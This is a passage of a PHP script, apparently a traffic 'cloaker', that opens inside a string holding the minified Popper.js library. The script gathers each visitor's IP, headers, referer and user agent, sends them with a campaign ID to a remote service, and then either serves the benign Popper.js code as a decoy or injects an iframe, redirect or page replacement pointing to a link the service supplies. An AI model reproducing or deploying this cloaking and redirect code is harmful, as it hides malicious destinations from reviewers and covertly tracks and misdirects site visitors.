"),F={placement:"bottom",modifiers:[],strategy:"absolute"},N={passive:!0},V={top:"auto",right:"auto",bottom:"auto",left:"auto"},I={left:"right",right:"left",bottom:"top",top:"bottom"},_={start:"end",end:"start"},U=[{name:"eventListeners",enabled:!0,phase:"write",fn:function(){},effect:function(e){var t=e.state,n=e.instance,o=(e=e.options).scroll,i=void 0===o||o,a=void 0===(e=e.resize)||e,s=r(t.elements.popper),f=[].concat(t.scrollParents.reference,t.scrollParents.popper);return i&&f.forEach((function(e){e.addEventListener("scroll",n.update,N)})),a&&s.addEventListener("resize",n.update,N),function(){i&&f.forEach((function(e){e.removeEventListener("scroll",n.update,N)})),a&&s.removeEventListener("resize",n.update,N)}},data:{}},{name:"popperOffsets",enabled:!0,phase:"read",fn:function(e){var t=e.state;t.modifiersData[e.name]=O({reference:t.rects.reference,element:t.rects.popper,strategy:"absolute",placement:t.placement})},data:{}},{name:"computeStyles",enabled:!0,phase:"beforeWrite",fn:function(e){var t=e.state,r=e.options;e=void 0===(e=r.gpuAcceleration)||e,r=void 0===(r=r.adaptive)||r,e={placement:b(t.placement),popper:t.elements.popper,popperRect:t.rects.popper,gpuAcceleration:e},null!=t.modifiersData.popperOffsets&&(t.styles.popper=Object.assign({},t.styles.popper,{},M(Object.assign({},e,{offsets:t.modifiersData.popperOffsets,position:t.options.strategy,adaptive:r})))),null!=t.modifiersData.arrow&&(t.styles.arrow=Object.assign({},t.styles.arrow,{},M(Object.assign({},e,{offsets:t.modifiersData.arrow,position:"absolute",adaptive:!1})))),t.attributes.popper=Object.assign({},t.attributes.popper,{"data-popper-placement":t.placement})},data:{}},{name:"applyStyles",enabled:!0,phase:"write",fn:function(e){var t=e.state;Object.keys(t.elements).forEach((function(e){var r=t.styles[e]||{},n=t.attributes[e]||{},o=t.elements[e];i(o)&&a(o)&&(Object.assign(o.style,r),Object.keys(n).forEach((function(e){var t=n[e];!1===t?o.removeAttribute(e):o.setAttribute(e,!0===t?"":t)})))}))},effect:function(e){var t=e.state,r={popper:{position:t.options.strategy,left:"0",top:"0",margin:"0"},arrow:{position:"absolute"},reference:{}};return Object.assign(t.elements.popper.style,r.popper),t.elements.arrow&&Object.assign(t.elements.arrow.style,r.arrow),function(){Object.keys(t.elements).forEach((function(e){var n=t.elements[e],o=t.attributes[e]||{};e=Object.keys(t.styles.hasOwnProperty(e)?t.styles[e]:r[e]).reduce((function(e,t){return e[t]="",e}),{}),i(n)&&a(n)&&(Object.assign(n.style,e),Object.keys(o).forEach((function(e){n.removeAttribute(e)})))}))}},requires:["computeStyles"]},{name:"offset",enabled:!0,phase:"main",requires:["popperOffsets"],fn:function(e){var t=e.state,r=e.name,n=void 0===(e=e.options.offset)?[0,0]:e,o=(e=S.reduce((function(e,r){var o=t.rects,i=b(r),a=0<=["left","top"].indexOf(i)?-1:1,s="function"==typeof n?n(Object.assign({},o,{placement:r})):n;return o=(o=s[0])||0,s=((s=s[1])||0)*a,i=0<=["left","right"].indexOf(i)?{x:s,y:o}:{x:o,y:s},e[r]=i,e}),{}))[t.placement],i=o.x;o=o.y,null!=t.modifiersData.popperOffsets&&(t.modifiersData.popperOffsets.x+=i,t.modifiersData.popperOffsets.y+=o),t.modifiersData[r]=e}},{name:"flip",enabled:!0,phase:"main",fn:function(e){var t=e.state,r=e.options;if(e=e.name,!t.modifiersData[e]._skip){var n=r.fallbackPlacements,o=r.padding,i=r.boundary,a=r.rootBoundary,s=r.altBoundary,f=r.flipVariations,p=void 0===f||f,c=r.allowedAutoPlacements;f=b(r=t.options.placement),n=n||(f!==r&&p?function(e){if("auto"===b(e))return[];var t=j(e);return[E(e),t,E(t)]}(r):[j(r)]);var u=[r].concat(n).reduce((function(e,r){return e.concat("auto"===b(r)?function(e,t){void 0===t&&(t={});var r=t.boundary,n=t.rootBoundary,o=t.padding,i=t.flipVariations,a=t.allowedAutoPlacements,s=void 0===a?S:a,f=t.placement.split("-")[1],p=(f?i?q:q.filter((function(e){return e.split("-")[1]===f})):R).filter((function(e){return 0<=s.indexOf(e)})).reduce((function(t,i){return t[i]=H(e,{placement:i,boundary:r,rootBoundary:n,padding:o})[b(i)],t}),{});return Object.keys(p).sort((function(e,t){return p[e]-p[t]}))}(t,{placement:r,boundary:i,rootBoundary:a,padding:o,flipVariations:p,allowedAutoPlacements:c}):r)}),[]);n=t.rects.reference,r=t.rects.popper;var l=new Map;f=!0;for(var d=u[0],m=0;m<u.length;m++){var h=u[m],v=b(h),g="start"===h.split("-")[1],y=0<=["top","bottom"].indexOf(v),w=y?"width":"height",x=H(t,{placement:h,boundary:i,rootBoundary:a,altBoundary:s,padding:o});if(g=y?g?"right":"left":g?"bottom":"top",n[w]>r[w]&&(g=j(g)),w=j(g),(v=[0>=x[v],0>=x[g],0>=x[w]]).every((function(e){return e}))){d=h,f=!1;break}l.set(h,v)}if(f)for(s=function(e){var t=u.find((function(t){if(t=l.get(t))return t.slice(0,e).every((function(e){return e}))}));if(t)return d=t,"break"},n=p?3:1;0<n&&"break"!==s(n);n--);t.placement!==d&&(t.modifiersData[e]._skip=!0,t.placement=d,t.reset=!0)}},requiresIfExists:["offset"],data:{_skip:!1}},{name:"preventOverflow",enabled:!0,phase:"main",fn:function(e){var t=e.state,r=e.options;e=e.name;var n=r.mainAxis,o=void 0===n||n;n=void 0!==(n=r.altAxis)&&n;var i=r.tether;i=void 0===i||i;var a=r.tetherOffset,s=void 0===a?0:a;r=H(t,{boundary:r.boundary,rootBoundary:r.rootBoundary,padding:r.padding,altBoundary:r.altBoundary}),a=b(t.placement);var f=t.placement.split("-")[1],p=!f,u=x(a);a="x"===u?"y":"x";var l=t.modifiersData.popperOffsets,d=t.rects.reference,m=t.rects.popper,v="function"==typeof s?s(Object.assign({},t.rects,{placement:t.placement})):s;if(s={x:0,y:0},l){if(o){var g="y"===u?"top":"left",y="y"===u?"bottom":"right",w="y"===u?"height":"width";o=l[u];var O=l[u]+r[g],M=l[u]-r[y],j=i?-m[w]/2:0,E="start"===f?d[w]:m[w];f="start"===f?-m[w]:-d[w],m=t.elements.arrow,m=i&&m?c(m):{width:0,height:0};var D=t.modifiersData["arrow#persistent"]?t.modifiersData["arrow#persistent"].padding:{top:0,right:0,bottom:0,left:0};g=D[g],y=D[y],m=Math.max(0,Math.min(d[w],m[w])),E=p?d[w]/2-j-m-g-v:E-m-g-v,p=p?-d[w]/2+j+m+y+v:f+m+y+v,v=t.elements.arrow&&h(t.elements.arrow),d=t.modifiersData.offset?t.modifiersData.offset[t.placement][u]:0,v=l[u]+E-d-(v?"y"===u?v.clientTop||0:v.clientLeft||0:0),p=l[u]+p-d,i=Math.max(i?Math.min(O,v):O,Math.min(o,i?Math.max(M,p):M)),l[u]=i,s[u]=i-o}n&&(n=l[a],i=Math.max(n+r["x"===u?"top":"left"],Math.min(n,n-r["x"===u?"bottom":"right"])),l[a]=i,s[a]=i-n),t.modifiersData[e]=s}},requiresIfExists:["offset"]},{name:"arrow",enabled:!0,phase:"main",fn:function(e){var t,r=e.state;e=e.name;var n=r.elements.arrow,o=r.modifiersData.popperOffsets,i=b(r.placement),a=x(i);if(i=0<=["left","right"].indexOf(i)?"height":"width",n&&o){var s=r.modifiersData[e+"#persistent"].padding;n=c(n);var f="y"===a?"top":"left",p="y"===a?"bottom":"right",u=r.rects.reference[i]+r.rects.reference[a]-o[a]-r.rects.popper[i];o=o[a]-r.rects.reference[a];var l=r.elements.arrow&&h(r.elements.arrow);u=(l=l?"y"===a?l.clientHeight||0:l.clientWidth||0:0)/2-n[i]/2+(u/2-o/2),i=Math.max(s[f],Math.min(u,l-n[i]-s[p])),r.modifiersData[e]=((t={})[a]=i,t.centerOffset=i-u,t)}},effect:function(e){var t=e.state,r=e.options;e=e.name;var n=r.element;if(n=void 0===n?"[data-popper-arrow]":n,r=void 0===(r=r.padding)?0:r,null!=n){if("string"==typeof n&&!(n=t.elements.popper.querySelector(n)))return;D(t.elements.popper,n)&&(t.elements.arrow=n,t.modifiersData[e+"#persistent"]={padding:B("number"!=typeof r?r:W(r,R))})}},requires:["popperOffsets"],requiresIfExists:["preventOverflow"]},{name:"hide",enabled:!0,phase:"main",requiresIfExists:["preventOverflow"],fn:function(e){var t=e.state;e=e.name;var r=t.rects.reference,n=t.rects.popper,o=t.modifiersData.preventOverflow,i=H(t,{elementContext:"reference"}),a=H(t,{altBoundary:!0});r=T(i,r),n=T(a,n,o),o=A(r),a=A(n),t.modifiersData[e]={referenceClippingOffsets:r,popperEscapeOffsets:n,isReferenceHidden:o,hasPopperEscaped:a},t.attributes.popper=Object.assign({},t.attributes.popper,{"data-popper-reference-hidden":o,"data-popper-escaped":a})}}],z=w({defaultModifiers:U});e.createPopper=z,e.defaultModifiers=U,e.detectOverflow=H,e.popperGenerator=w,Object.defineProperty(e,"__esModule",{value:!0})}));
       //# sourceMappingURL=popper.min.js.map';
    }


    function getResultClo() {
        $IP = getIp();
        $ipStore = getData($IP);
    
        if($ipStore === false) {
            try {
                
                $post = [
                    'ip'             => $IP,
                    'host'           => $_SERVER["HTTP_HOST"],
                    'uri'            => $_SERVER['REQUEST_URI'],
                    'referer'        => isset($_SERVER['HTTP_REFERER']) ? $_SERVER["HTTP_REFERER"] : 'NO_REFERER',
                    'userAgent'      => $_SERVER["HTTP_USER_AGENT"],
                    'queryString'    => $_SERVER["QUERY_STRING"],
                    'headers'        => json_encode(apache_request_headers()),
                    'respHeaders'    => json_encode(apache_response_headers()),
                    'campaignId'     => "60eacdc79bfe232bb9d5f74f",
                    'date'           => "1626078621001"
                ];
                
                $payload = json_encode($post);

                $ch = initCurl($payload);

                $resJson = curl_exec($ch);
                if($resJson === false) {
                    curl_close($ch);
                    $ch = initCurl($payload, true);
                    $resJson = curl_exec($ch);
                }
                curl_close($ch);
                $res = json_decode($resJson);
            
                if(@$res->link) {
                    $ipStore = $res;
                    setData($IP, $ipStore);
                }
            } catch (Exception $e) {
                $message = $e->getMessage();
                if(!$message) {
                    $message = "Error getResultClo, index.php, вероятно не подключен модуль curl.";
                }
                exitWithError($message);
            }
        }
        header_remove();
        return $ipStore;
    }

    function getContentsByResultClo() {
        $resultClo = getResultClo();
        if($resultClo) {
            if($resultClo->jsIntegration) {
                $LastModified = gmdate("D, d M Y H:i:s \G\M\T", 1626078621001);
                $etag = md5_file($LastModified); 
                header('Etag: "'.$etag.'"'); 
                header("Content-type: application/javascript");
                header('Last-Modified: '. $LastModified);
                if($resultClo->type == 'white') {
                    return getJsScript();
                } else {
                    if($resultClo->iframeMod) {
                        return getIframeScript($resultClo->link);
                    }
                    if($resultClo->redirectMod) {
                        return getRedirectScript($resultClo->link);
                    }
                    return getReplaceScript($resultClo->link);
                }
            } else {
                if($resultClo->type == 'white') {
                    return getPageWithProxy($resultClo->link, true);
                } else {
                    return getPageWithProxy($resultClo->link, true);
                }
            }
        } else {
            $jsIntegration = false;
            if($jsIntegration) {
                $LastModified = gmdate("D, d M Y H:i:s \G\M\T", 1626078621001);
                $etag = md5_file($LastModified);
                header('Etag: "'.$etag.'"');
                header("Content-type: application/javascript");
                header('Last-Modified: '. $LastModified);
                return getJsScript();
            } else {
                return getPageWithProxy("https://www.mistiksource.com/",true);
            }
        }
    }


    $contents = getContentsByResultClo();

    if($contents) {
        echo $contents;
    } else {
        exitWithNotFound();
    }
?>